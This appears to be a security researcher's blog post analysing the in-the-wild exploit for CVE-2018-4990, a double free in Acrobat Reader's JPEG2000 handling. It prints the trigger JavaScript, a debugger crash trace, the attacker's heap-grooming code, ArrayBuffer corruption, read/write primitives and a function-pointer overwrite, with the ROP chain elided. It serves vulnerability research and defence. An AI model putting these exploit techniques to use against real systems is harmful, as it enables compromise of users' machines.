---
layout: post
title: "Adobe, Me and a Double Free:: Analyzing the CVE-2018-4990 Zero-Day Exploit"
date: 2018-05-21 09:00:00 -0500
categories: blog
excerpt_separator: <!--more-->
---

<img class="excel" alt="Acrobat Reader" src="/assets/images/reader.png">
<p class="cn" markdown="1">I managed to get my hands on a sample of CVE-2018-4990. This was a zero-day exploit affecting Acrobat Reader that was recently patched by Adobe in [apsb18-09](https://helpx.adobe.com/security/products/acrobat/apsb18-09.html). [Anton Cherepanov](https://www.welivesecurity.com/author/acherepanov/) at ESET wrote a blog post on it ([A tale of two zero-days](https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/)) which is a decent analysis, but it was missing some important things for me, such as how is the double free actually exploited.</p>
<!--more-->

<p class="cn">TL;DR</p>

<p class="cn">I walk through how the attacker(s) exploited CVE-2018-4990 which is a Double Free in Acrobat Reader when processing specially crafted JPG2000 images.</p>

### Introduction

<p class="cn" markdown="1">It's uncommon to see Acrobat Reader exploits in the wild these days so I decided to take a look at this one. All testing was done AcroRd32.exe (c4c6f8680efeedafa4bb7a71d1a6f0cd37529ffc) v2018.011.20035. Other versions are also affected, please see Adobe's bulletin [apsb18-09](https://helpx.adobe.com/security/products/acrobat/apsb18-09.html) for more details.</p>

### Getting to the root of the vulnerability

<p class="cn" markdown="1">

The first thing I needed to do was uncompress the PDF as many objects are compressed, hiding the true functionaility such as JavaScript and images. I like to use [pdf toolkit](https://www.pdflabs.com/tools/pdftk-the-pdf-toolkit/) since it's command line driven.</p>

`c:\> pdftk 4b672deae5c1231ea20ea70b0bf091164ef0b939e2cf4d142d31916a169e8e01 output poc.pdf uncompress`

<p class="cn" markdown="1">
Since I don't have an original sample of the JPG2000 image, I have no idea if this image was bitflipped or not, so I am only going to dive into the JavaScript.

After stripping away the rest of the JavaScript, we can see the following code will trigger the double free:</p>

```JavaScript
function trigger(){
    var f1 = this.getField("Button1");
    if(f1){
        f1.display = display.visible;
    }
}
trigger();
```
<p class="cn" markdown="1">


The JavaScript comes from an OpenAction triggered from the root node</p>

```

1 0 obj 
<<
/Length 933
>>
stream
function trigger(){
    var f1 = this.getField("Button1");
    if(f1){
        f1.display = display.visible;
    }
}
trigger();
endstream 
endobj

...

5 0 obj 
<<
/Outlines 2 0 R
/Pages 3 0 R
/OpenAction 6 0 R
/AcroForm 7 0 R
/Type /Catalog
>>
endobj 
6 0 obj 
<<
/JS 1 0 R
/Type /Action
/S /JavaScript
>>
endobj 

...

trailer

<<
/Root 5 0 R
/Size 39
>>
```

<p class="cn" markdown="1">With page heap and user-mode stack traces enabled, we get the following crash.</p>

```
(a48.1538): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=d0d0d0b0 ebx=00000000 ecx=d0d0d000 edx=d0d0d0b0 esi=020e0000 edi=020e0000
eip=66886e88 esp=0022a028 ebp=0022a074 iopl=0         nv up ei ng nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010286
verifier!AVrfpDphFindBusyMemoryNoCheck+0xb8:
66886e88 813abbbbcdab    cmp     dword ptr [edx],0ABCDBBBBh ds:0023:d0d0d0b0=????????
0:000> kv
ChildEBP RetAddr  Args to Child              
0022a074 66886f95 020e1000 d0d0d0d0 020e0000 verifier!AVrfpDphFindBusyMemoryNoCheck+0xb8 (FPO: [SEH])
0022a098 66887240 020e1000 d0d0d0d0 0022a108 verifier!AVrfpDphFindBusyMemory+0x15 (FPO: [2,5,0])
0022a0b4 66889080 020e1000 d0d0d0d0 0078d911 verifier!AVrfpDphFindBusyMemoryAndRemoveFromBusyList+0x20 (FPO: [2,3,0])
0022a0d0 777969cc 020e0000 01000002 d0d0d0d0 verifier!AVrfDebugPageHeapFree+0x90 (FPO: [3,3,0])
0022a118 77759e07 020e0000 01000002 d0d0d0d0 ntdll!RtlDebugFreeHeap+0x2f (FPO: [SEH])
0022a20c 777263a6 00000000 d0d0d0d0 387e2f98 ntdll!RtlpFreeHeap+0x5d (FPO: [SEH])
0022a22c 7595c614 020e0000 00000000 d0d0d0d0 ntdll!RtlFreeHeap+0x142 (FPO: [3,1,4])
0022a240 5df7ecfa 020e0000 00000000 d0d0d0d0 kernel32!HeapFree+0x14 (FPO: [3,0,0])
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Adobe\Acrobat Reader DC\Reader\JP2KLib.dll - 
0022a254 667d0574 d0d0d0d0 7ea9257c 69616fac MSVCR120!free+0x1a (FPO: [Non-Fpo]) (CONV: cdecl) [f:\dd\vctools\crt\crtw32\heap\free.c @ 51]
WARNING: Stack unwind information not available. Following frames may be wrong.
0022a374 667e6482 35588fb8 4380cfd8 000000fd JP2KLib!JP2KCopyRect+0xbae6
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Adobe\Acrobat Reader DC\Reader\AcroRd32.dll - 
0022a3cc 511d6cfc 36496e88 68d96fd0 4380cfd8 JP2KLib!JP2KImageInitDecoderEx+0x24
0022a454 511d8696 3570afa8 69616fac 3570afa8 AcroRd32_50be0000!AX_PDXlateToHostEx+0x261843
0022a4b4 511cd785 69616fac 0022a4d4 511d6640 AcroRd32_50be0000!AX_PDXlateToHostEx+0x2631dd
0022a4c0 511d6640 69616fac 462f6f70 41826fc8 AcroRd32_50be0000!AX_PDXlateToHostEx+0x2582cc
0022a4d4 50dc030d 69616fac 41826fd0 41826fc8 AcroRd32_50be0000!AX_PDXlateToHostEx+0x261187
0022a510 50dbf92b c0010000 0000000d 41826fc8 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x7867d
0022a5e0 50dbebc6 0022a988 00000000 60b2d137 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x77c9b
0022a930 50dbeb88 0022a988 45c3aa50 60b2d163 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x76f36
0022a964 50dbea71 41826e28 45c3aa50 0022aa1c AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x76ef8
0022a9d0 50dbd949 c0010000 0000000d 45c3aa50 AcroRd32_50be0000!PDMediaQueriesGetCosObj+0x76de1
```

<p class="cn" markdown="1">We can see that the caller to free was JP2KLib!JP2KCopyRect+0xbae6, let's dive into that function to see where the second free is triggered.</p> 

{% include image.html
            img="assets/images/reader-df.png"
            title="The location of the double free in sub_1004F3BD"
            caption="The location of the double free in sub_1004F3BD"
            style="width:60%;height:60%" %}

<p class="cn" markdown="1">

So in order to trigger the vulnerability, the following rendering order happens:
</p>

<div markdown="1" class="cn">
1. Load PDF, parse (presumably) a malformed JP2K image inside of a field button. This triggers the first free.
2. Load the OpenAction which contains the JavaScript that will access the field button, setting a property and triggering the second free.
</div>

<p class="cn" markdown="1">
This gives the attackers a solid chance to re-use the freed chunk in JavaScript to trigger a use-after-free condition from the second free. I imagine having JavaScript execution before and after the heap buffer overflow in [CVE-2017-3055](https://www.zerodayinitiative.com/advisories/ZDI-17-280/) at Pwn2own 2017 was also required.

An interesting sidenote is, that many vulnerabilities are triggered via malformed static content combined with dynamic content accessing and manipulating that malformed content. This type of fuzzing is harder since it requires combined, mutation and generation based fuzzing strategies in a single fuzz iteration.</p>

#### Exploitation

<p class="cn" markdown="1">Before triggering the bug, the attackers used the following JavaScript:</p>

```JavaScript
var a         = new Array(0x3000);
var spraynum  = 0x1000;
var sprayarr  = new Array(spraynum);
var spraylen  = 0x10000-24;

// force allocations to get a clean heap
for(var i = 1; i < 0x3000; i++){
    a[i] = new Uint32Array(252);
}

// alloc to reclaim the freed buffer
for(var i = 1; i < spraynum; i++){
    sprayarr[i] = new ArrayBuffer(spraylen);
}

// make holes
for(var i = 1; i < 0x3000; i = i+2){
    delete a[i1];
    a[i1] = null;
}
```

<p class="cn" markdown="1">Essentially what this code is doing is stage 1:</p>

```
Stage 1 - Prepare Heap                    Stage 2 - Double Free                     Stage 3 - Reclaim Freed
+------------------------+                +------------------------+                +------------------------+
|                        |                |                        |                |                        |
|    Bin size: 0x508     |                |    Bin size: 0x508     |                |    Bin size: 0x508     |
|                        |                |                        |                |                        |
|    +--------------+    |                |    +--------------+    |                |    +--------------+    |
|    |              |    |                |    |              |    |                |    |              |    |
|    |  Freed       |    |                |    |  Freed       |    |                |    |  Freed       |    |
|    |              |    |                |    |              |    |                |    |              |    |
|    |              |    |                |    |              |    |                |    |              |    |
|    +--------------+    |                |    +--------------+    |                |    +--------------+    |
|    +--------------+    |                |    +--------------+    |                |    +--------------+    |
|    |              |    |                |    |              |    |                |    |              |    |
|    |  Allocated   |    |                |    |  Allocated   |    |                |    |  Allocated   |    |
|    |              |    |                |    |              |    |                |    |              |    |
|    |              |    |                |    |              |    |                |    |              |    |
|    +--------------+    |                |    +--------------+    |                |    +--------------+    |
|    +--------------+    |                |    +--------------+    |                |    +--------------+    |
|    |              |    |                |    |              |    |                |    |              |    |
|    |  Allocated   |    | +------------> |    |  Freed       |    | +------------> |    |  Freed       |    |
|    |              |    |                |    |              |    |                |    |  chunks      |    |
|    |              |    |                |    |              |    |                |    |  coalesced   |    |
|    +--------------+    |                |    +--------------+    |                |    |              |    |
|    +--------------+    |                |    +--------------+    |                |    |              |    |
|    |              |    |                |    |              |    |                |    |              |    |
|    |  Freed       |    |                |    |  Freed       |    |                |    |              |    |
|    |              |    |                |    |              |    |                |    |              |    |
|    |              |    |                |    |              |    |                |    |              |    |
|    +--------------+    |                |    +--------------+    |                |    +--------------+    |
|                        |                |                        |                |                        |
|                        |                |                        |                |                        |
+------------------------+                +------------------------+                +------------------------+

```

<p class="cn" markdown="1">The code that makes the holes is using `for(var i = 1; i < 0x3000; i = i+2)` meaning that for every 2 allocations, a free is triggered. Then, the double free is triggered on one of the allocated slots. When this happens, the windows heap manager coalesces the chunks producing an empty slot of 0x2000.
</p>

<p class="cn" markdown="1">Now that the attackers have created this condition, they perform the following JavaScript code:</p>

```JavaScript
    // re-claims the memory, like yoru typical use after free
    for(var i = 1;i < 0x40; i++){
        sprayarr2[i] = new ArrayBuffer(0x20000-24);
    }
```
<p class="cn" markdown="1">This code reclaims the freed memory from the double free and since the slot is larger (due to the coalesce) they need to allocate double the size than they originally did. Now that the attackers have reclaimed the freed memory they need to find out which ArrayBuffer inside of `sprayarr` has been doubled in size.</p>

```JavaScript
    for(var i = 1;i < spraynum; i++){
        if( sprayarr[i].byteLength == 0x20000-24){
            
            var biga = new DataView(sprayarr[i1]);
            biga.setUint32(0x10000-12,0x66666666);

            // +1 because the next reference as a corrupted length now.
            if(sprayarr[i+1].byteLength == 0x66666666){

                // game over attackers can read/write out of biga
                biga = new DataView(sprayarr[i+1]);

                ...

                mydv = biga;
            }
```

<p class="cn" markdown="1">Now that they know, which has a large size, they use it to overwrite the byte length of the adjacent ArrayBuffer. Then they just check that the next ArrayBuffer has a matching byte length and if it does, then they have a full read/write primitive.</p>

```
function myread(addr){
    mydv.setUint32(mypos,addr,true);
    var res = myarray[0];
    mydv.setUint32(mypos,myarraybase,true);
    return res;
}

function mywrite(addr,value){
    mydv.setUint32(mypos,addr,true);
    myarray[0] = value ;
    mydv.setUint32(mypos,myarraybase,true);
}
```
<p class="cn" markdown="1">At this point it's game over. They could have gone with a data only attack but there is no need since Acrobat Reader has no Control Flow Guard (CFG) so they opted for the traditional call gate control flow. First they located the EScript.api and got the dll base address, then they built a rop chain with a dll loader stub, overwrote the bookmark object's execute function pointer to finally redirect execution flow.</p>

```
var bkm = this.bookmarkRoot;        
var objescript = 0x23A59BA4 - 0x23800000 + dll_base;
objescript = myread(objescript);

...

mywrite(objescript, 0x6b707d06 - 0x6b640000 + dll_base); 
mywrite(objescript+4,myarraybase);
mywrite(objescript+0x598,0x6b68389f - 0x6b640000 + dll_base);

// adios!
bkm.execute();
```

### Conclusion

<p class="cn">Adobe Acrobat Reader is still a great target for attackers since JavaScript is so flexible with ArrayBuffers and PDF parsing is so complicated. OS mitigations have very little impact and it's up to Adobe to opt-in and harden it's binaries (/GUARD:CF) to make exploitation harder. Had Adobe enabled CFG and developed a form of isolated heap (like they did with flash) then this bug might have been much harder to exploit.

As already mentioned, this sample looks like it was still in active development, no obfuscation was done on the JavaScript, but this is very much a throw away bug as I'm sure many other bugs exist in JP2KLib.dll.</p>

### References

<div markdown="1" class="cn">
- [https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/](https://www.welivesecurity.com/2018/05/15/tale-two-zero-days/)
</div>